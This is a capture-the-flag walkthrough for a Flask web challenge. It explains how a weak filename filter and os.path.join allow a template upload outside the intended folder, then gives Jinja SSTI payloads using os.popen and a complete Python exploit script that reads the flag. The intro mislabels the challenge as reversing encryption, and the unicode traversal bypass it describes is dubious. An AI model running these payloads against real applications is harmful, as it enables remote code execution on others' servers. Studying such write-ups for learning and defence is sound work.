# Studio - Flagyard CTF Walkthrough

This is a walkthrough for solving the **Studio** challenge from the **Flagyard CTF**. The challenge involves reversing a custom encryption process to retrieve the original input that satisfies the conditions.

## Challenge Description

What issues can arise with certain types of music?

```python
import os
from flask import Flask, render_template, request, redirect, url_for, flash, send_from_directory
from werkzeug.exceptions import RequestEntityTooLarge

app = Flask(__name__)
app.config['TEMPLATES_AUTO_RELOAD'] = True
app.config['UPLOAD_FOLDER'] = './music_files/'  # /app/music_files/
app.config['MAX_CONTENT_LENGTH'] = 1 * 1024 * 1024
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY') or '4cf129f6c1e7d7a7a96d944b78a935ac'

@app.route('/')
def home():
    page = request.args.get('page')
    try:
        return render_template('home.html', page=f'{page}.html')
    except:
        return render_template('home.html')

@app.route('/music')
def music():
    music_files = filter(lambda f: f.endswith('.mp3'), os.listdir(app.config['UPLOAD_FOLDER']))
    return render_template('music.html', music_files=music_files)

@app.route('/upload', methods=['POST'])
def upload():
    def safe_filename(file):
        if '../' in file:
            return safe_filename(file.replace('../', ''))
        return file
    try:
        music_file = request.files.get('music_file')
        dst_file = safe_filename(music_file.filename)
        if music_file and dst_file.split('.')[1] == 'mp3':
            flash('File uploaded')
            music_file.save(os.path.join(app.config['UPLOAD_FOLDER'], dst_file))
        else:
            flash('File blocked')
    except RequestEntityTooLarge:
        flash('File is too large')
    return redirect(url_for('music'))

@app.route('/download')
def download():
    music_file = request.args.get('music_file')
    if music_file:
        return send_from_directory(app.config['UPLOAD_FOLDER'], music_file, as_attachment=True)
    return redirect(url_for('home'))
```

We are provided with the server-side code of this web application. Let’s analyze the code to identify vulnerabilities and determine how to exploit them.

---

## /Route
```python
@app.route('/')
def home():
    page = request.args.get('page')
    try:
        return render_template('home.html', page=f'{page}.html')
    except:
        return render_template('home.html')
```

The / endpoint takes a page parameter from the URL and appends .html to it. If a file with that name exists in the templates folder, it renders that page. Otherwise, it defaults to rendering home.html. This behavior is key to exploiting the vulnerability, as we will see later.

---

## **/Music** Route

```python
@app.route('/music')
def music():
    music_files = filter(lambda f: f.endswith('.mp3'), os.listdir(app.config['UPLOAD_FOLDER']))
    return render_template('music.html', music_files=music_files)
```
The /music endpoint displays only files ending with .mp3 on the music.html page. It filters the list of files in the upload folder and passes only those with the .mp3 extension to the template.

---

## /upload Route
Now, let’s dive into the interesting part of the code.
```python
@app.route('/upload', methods=['POST'])
def upload():
    def safe_filename(file):
        if '../' in file:
            return safe_filename(file.replace('../', ''))
        return file
    try:
        music_file = request.files.get('music_file')
        dst_file = safe_filename(music_file.filename)
        if music_file and dst_file.split('.')[1] == 'mp3':
            flash('File uploaded')
            music_file.save(os.path.join(app.config['UPLOAD_FOLDER'], dst_file))
        else:
            flash('File blocked')
    except RequestEntityTooLarge:
        flash('File is too large')
    return redirect(url_for('music'))
```
The /upload endpoint handles the upload of a music_file provided by the user. The uploaded file's name is passed to the safe_filename() function to sanitize it.
```python
def safe_filename(file):
    if '../' in file:
        return safe_filename(file.replace('../', ''))
    return file
```
The safe_filename() function recursively checks for ../ in the filename and removes it if found. This aims to prevent directory traversal, but it's not effective. This can be bypassed using Unicode representations like \u002e\, which stands for ..

After sanitizing the filename, the code checks if the file extension is mp3. It does this by splitting the filename on the . character and checking whether the string after the first . is mp3. However, this method is flawed and can be bypassed with filenames like bypassed.mp3.php, where .mp3 is just a misleading part of the filename. This superficial check does not fully validate the actual file type.

If the file passes the extension check, the following line of code saves it:
```python
music_file.save(os.path.join(app.config['UPLOAD_FOLDER'], dst_file))
```
The os.path.join() function joins the upload folder with the filename, creating the final upload path. In this application, app.config['UPLOAD_FOLDER'] is set to ./music_files/, which means that if the sanitized filename is malicious.mp3, the final save path would be ./music_files/malicious.mp3.

However, the main vulnerability lies here: os.path.join() is susceptible to path traversal attacks because there is no validation to ensure that the final path remains within the intended music_files directory. For example, if a malicious filename like ../../evil.mp3 is provided and not sanitized adequately, it could allow the file to be saved outside of the intended folder, potentially overwriting critical files or saving in unauthorized locations.

In summary, the vulnerability arises due to incomplete sanitization and the lack of final path validation, making the endpoint susceptible to path traversal attacks. We can exploit this to save files in unintended directories, gaining unauthorized control over the file structure.

---

# Exploitation

To achieve Remote Code Execution (RCE) and retrieve the flag, one approach is to upload an HTML file to the templates directory (/app/templates) and achieve Server-Side Template Injection (SSTI) using it. Let’s begin the exploitation process.

There are two ways to solve this:

    Relative Path Method

    Absolute Path Method
### Relative Path Method

For the relative path method, we need ../ in our filename to reach the templates folder. However, since ../ is being filtered, we can bypass this restriction by using the Unicode representation for . (\u002e). Thus, our filename would be \u002e\u002e/templates/malicious.mp3.html, which is equivalent to ../templates/malicious.mp3.html. This allows us to navigate one directory back to where the templates folder is located, then move into the templates folder and save malicious.mp3.html there.

### Absolute Path Method

This method is simpler because we don’t need to bypass the ../ filter. We can simply provide the absolute path, which is /app/templates/malicious.mp3.html. The os.path.join() function will save it to the absolute path, effectively ignoring app.config['UPLOAD_FOLDER'] because an absolute path takes precedence over a relative path.

## SSTI Exploit

To exploit the SSTI vulnerability, we need a simple HTML file that can trigger SSTI when rendered. Below is a straightforward HTML file for this purpose:
```html
<html>
<head>
    <title>SSTI Exploit</title>
</head>
<body>
    <h1>Triggering SSTI</h1>
    <textarea type="text" id="page" name="page">{{7*7}}</textarea>
</body>
</html>
```
In this file, our SSTI payload is placed in the <textarea> element. This will evaluate the expression {{7*7}} if SSTI is present, allowing us to confirm that the vulnerability works.

The file is uploaded, but how do we access it? We can only see the output if malicious.mp3.html is rendered. This is where the following line of code comes in handy:
```python
render_template('home.html', page=f'{page}.html')
```
We can render our malicious.mp3.html by passing the page parameter like this:
```
http://your-instance-url/?page=malicious.mp3
```

This will render our HTML, and the result of 7*7 (which is 49) will be displayed in the <textarea> field, confirming that SSTI is successfully triggered.

---

## Final Payload for SSTI

Our final payload for SSTI will be:
```html
{{config.__class__.__init__.__globals__['os'].popen('ls -l /app').read()}}
```

This payload will achieve Remote Code Execution (RCE) using SSTI.

To execute this, simply replace the value and re-upload the file. Here is how the updated HTML file looks:
```html
<html>
<head>
    <title>SSTI Exploit</title>
</head>
<body>
    <h1>Triggering SSTI</h1>
    <textarea type="text" id="page" name="page">{{config.__class__.__init__.__globals__['os'].popen('ls -la').read()}}</textarea>
</body>
</html>
```

After uploading, access the payload by visiting:

```
http://your-instance-url/?page=malicious.mp3
```

This will render the updated HTML and execute the command, showing the output of ls -la in the <textarea> field, thus achieving RCE.

---

## Python Automated Script

I wrote a Python script to automate the entire process for retrieving the flag.
```python
import requests
import os
from urllib.parse import urlencode
from urllib.parse import urlparse
from bs4 import BeautifulSoup

url = "your-instance-url/"  # Add "/" at the end of the URL

def upload_file():
    parsed_url = urlparse(url)
    hostname = parsed_url.netloc

    headers = {
        'Host': hostname,
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryu1i8nw4tZ1Hi1EN7',
        'Connection': 'keep-alive',
    }

    data = '''------WebKitFormBoundaryu1i8nw4tZ1Hi1EN7\r\nContent-Disposition: form-data; name="music_file"; filename="/app/templates/malicious.mp3.html"\r\nContent-Type: text/html\r\n\r\n<html>
    <head>
        <title>SSTI Exploit</title>
    </head>
    <body>
        <h1>Triggering SSTI</h1>
        <form action="/" method="get">
            <input type="text" id="page" name="page" value="{{config.__class__.__init__.__globals__['os'].popen('cat $(find / -name flag.txt 2>/dev/null)').read()}}">
            <button type="submit">Submit</button>
        </form>
        <p id="output"></p>
    </body>
</html>\r\n------WebKitFormBoundaryu1i8nw4tZ1Hi1EN7--\r\n'''

    upload_url = f"{url}upload"
    response = requests.post(upload_url, headers=headers, data=data, verify=False)

    if "File uploaded" in response.text:
        print("[*] File uploaded successfully.")
    else:
        print("[*] Upload failed.")
        print(response.text)

def access_payload():
    access_url = f"{url}?page=malicious.mp3"
    response = requests.get(access_url)

    if response.status_code == 200:
        print("[*] Payload executed successfully.")

        soup = BeautifulSoup(response.text, 'html.parser')
        input_tag = soup.find('input', {'id': 'page'})

        if input_tag and input_tag.has_attr('value'):
            output = input_tag['value'].strip()

            if output:
                print(f"[*] Flag: {output}")
            else:
                print("Extracted value from input tag is empty.")
        else:
            print("Failed to locate the input element in the response.")
    else:
        print("Failed to execute payload.")

if __name__ == "__main__":
    upload_file()
    access_payload()

```
This script automates the process of uploading the malicious file, triggering the SSTI vulnerability, and retrieving the flag. Let me know if you need further assistance!

---
### Contact me: 

<a href="https://www.instagram.com/t2tt/" style="color: white; text-decoration: none;">
  <img src="https://upload.wikimedia.org/wikipedia/commons/9/95/Instagram_logo_2022.svg" alt="Instagram" width="30" />
</a>


